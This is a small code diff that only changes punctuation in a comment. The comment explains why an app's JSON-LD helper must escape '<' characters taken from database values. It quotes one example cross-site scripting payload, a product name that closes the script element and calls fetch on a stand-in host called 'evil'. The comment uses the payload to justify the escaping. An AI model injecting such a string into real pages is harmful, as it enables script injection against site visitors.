@@ -2,8 +2,8 @@
  * The single way this app emits JSON-LD.
  *
  * `JSON.stringify` does not escape `<`, so any value that reaches structured
- * data from the database — a product name, a menu item, an admin-authored
- * description — could close the script element and inject markup:
+ * data from the database - a product name, a menu item, an admin-authored
+ * description - could close the script element and inject markup:
  *
  *     name: 'Latte </script><script>fetch("//evil")</script>'
  *
